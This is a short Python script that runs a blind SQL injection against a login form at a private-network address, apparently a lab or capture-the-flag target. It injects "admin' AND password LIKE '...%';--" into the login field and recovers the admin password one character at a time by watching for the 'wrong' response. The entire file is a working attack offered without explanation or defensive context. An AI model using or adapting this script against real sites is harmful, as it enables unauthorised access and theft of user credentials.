#!/usr/bin/python

import requests
import string

url = 'http://10.33.3.14:8083'
login="admin' AND password LIKE 'PASS%';--"
PASS = "_"
line = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-'

chars = list(line)

s = requests.session()
param={'login': 'admin', 'password': ''}
param_o={'login': 'admin', 'password': ''}
header = {'User-Agent': 'Mozilla/5.0'}

global pass_t

pc = 0
pass_t = ""

def char():
    global pc, chars
    pc += 1
    if pc == len(chars):
        pc = 0
    return chars[pc]

while len(PASS) < 55 :
    reponse = s.post(url,headers = header, data = param_o)
    while 'wrong' in reponse.text.lower() :
        login_c = login
        pass_t = PASS + char()
        login_c = login_c.replace('PASS', pass_t)
        param = {'login' : login_c, 'password' : ''}
        reponse = s.post(url, headers = header, data = param)
        print(pass_t)

    PASS = pass_t
    print(PASS)